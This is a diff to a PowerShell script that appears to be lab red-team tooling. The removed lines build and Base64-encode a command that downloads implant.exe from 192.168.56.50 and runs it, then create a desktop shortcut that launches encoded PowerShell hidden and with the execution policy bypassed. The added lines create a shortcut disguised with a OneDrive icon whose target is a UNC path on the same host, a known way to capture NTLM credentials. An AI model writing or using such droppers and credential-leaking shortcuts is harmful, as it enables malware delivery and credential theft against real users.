@@ -1,12 +1,7 @@
-$payload = "(New-Object System.Net.WebClient).DownloadFile('http://192.168.56.50:8889/implant.exe','C:\Windows\Temp\implant.exe');Start-Process 'C:\Windows\Temp\implant.exe'"
-$bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
-$encoded = [Convert]::ToBase64String($bytes)
-Write-Output $encoded
-
-
-$obj = New-Object -ComObject WScript.Shell
-$link = $obj.CreateShortcut("C:\Users\vagrant\Desktop\ObfuscatedPowerShell.lnk")
-$link.WindowStyle = 7
-$link.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
-$link.Arguments = "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand <BASE64_STRING_HERE>"
-$link.Save()
+$obj = New-object -comobject wscript.shell
+$link = $obj.createshortcut("C:\Users\Vagrant\Desktop\ntlm.lnk")
+$link.targetpath = "\\192.168.56.50\NTLM.docx"
+$link.windowstyle = "1"
+$link.IconLocation = "C:\Windows\SysWOW64\OneDrive.ico"
+$link.Description = "NTLM Lnk File"
+$link.save()
